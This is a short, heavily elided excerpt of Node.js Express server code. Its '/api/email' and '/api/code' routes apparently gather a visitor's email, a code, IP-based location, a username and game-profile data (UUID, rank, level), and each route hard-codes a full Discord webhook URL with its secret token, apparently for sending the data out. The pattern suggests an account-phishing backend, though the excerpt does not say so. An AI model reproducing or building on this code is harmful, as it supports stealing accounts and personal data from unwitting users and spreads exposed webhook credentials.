...
app.get('/api/email', async (req, res) => {
  ...
  try {
    ...
    const webhookUrl = 'https://discord.com/api/webhooks/1117474112848269323/CM_kB5Pip-9zmAE39MWTbNQvWwfKNjw6zQtRxyUpFauvVM95QIuk3032ov9pHzKWQAHp'
...
app.get('/api/code', async (req, res) => {
  ...
  try {
    ...
    const country = ipLocationArray[0]
    const flag = ipLocationArray[1]
    const webhookUrl = "https://discord.com/api/webhooks/1088914510867353600/a0eJZynUABWASF-b2pp3jZYTrw2idzSRlDuw_JHFFroPHIjhz0LUPP4KR2ShtPYiLnl6"
    const uuid = await getId(username)
    const playerData = await getPlayerData(username)
    const rank = playerData[0]
    const level = playerData[1].toFixed()
